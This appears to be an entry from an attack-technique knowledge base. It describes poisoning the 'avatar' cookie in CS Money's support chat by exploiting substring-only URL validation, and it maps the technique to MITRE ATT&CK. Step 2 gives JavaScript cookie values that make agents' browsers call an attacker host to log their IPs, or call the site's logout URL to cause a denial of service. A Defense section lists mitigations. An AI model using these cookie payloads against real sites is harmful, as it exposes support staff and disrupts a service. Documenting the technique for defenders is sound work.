---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: Poison-Avatar-Cookie-with-Malicious-URL
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:26:48.850Z'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - cookie-poisoning
  - input-validation
commands: []
platforms:
  - Web
tools: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Poison-Avatar-Cookie-with-Malicious-URL

## Summary

This procedure modifies the 'avatar' cookie in CS Money's support chat system by prepending a malicious URL to a valid Steam avatar URL, exploiting weak server-side validation that only checks for a substring match.

## Description

The CS Money support chat fetches user avatars from Steam CDNs but validates the cookie value poorly, only ensuring it contains 'https://steamcdn-a.akamaihd.net/steamcommunity/'. Attackers can prepend arbitrary URLs (e.g., to their server for IP logging or to the site's logout for DoS), causing support agents' browsers to load the full poisoned URL when viewing chats. This leads to information disclosure or service disruption without direct interaction.

## Requirements

1. Access to CS Money website via a web browser
2. Browser with developer tools enabled (e.g., Chrome)
3. Attacker-controlled HTTPS server for logging (for IP leak variant)
4. Valid Steam avatar URL for appending

## Defense

Defensive measures and detection strategies:

- Implement full URL validation on server-side, parsing and whitelisting only exact Steam CDN domains
- Sanitize cookie values to prevent prepends/appends using regex or URL parsing libraries
- Monitor for anomalous avatar requests or mass logouts in support systems
- Use Content Security Policy (CSP) in agent interfaces to restrict image loads

## Objectives

1. Inject malicious URL into avatar cookie to bypass validation
2. Set up for client-side request forgery in support browsers
3. Achieve IP exposure or DoS on support agents

## Instructions

### Step 1: Inspect and Locate Avatar Cookie

**Context**: Open the support chat page and use developer tools to view application storage.

No specific command; use browser UI: Right-click > Inspect > Application tab > Cookies > Find 'avatar' under cs.money domain.

> Note the current value, which should be a Steam URL.

### Step 2: Modify Cookie Value

**Context**: Edit the cookie to prepend the malicious part while retaining the Steam string for validation.

Use browser dev tools to set new value:

For IP leak:

```javascript
// In console or edit directly
document.cookie = "avatar=https://attacker-server.com/log-ip/?https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/valid.jpg";
```

For DoS:

```javascript
// In console or edit directly
document.cookie = "avatar=https://cs.money/logout?https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/valid.jpg";
```

> The server accepts this as it contains the required substring. Refresh the page to confirm persistence.

### Step 3: Verify Modification

**Context**: Test if the site still functions, ensuring the poisoned cookie is sent.

No command; interact with the site and check network tab for cookie inclusion in requests.

> Expected: No validation errors; cookie transmitted as modified.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[cookie-poisoning]]
- [[input-validation]]
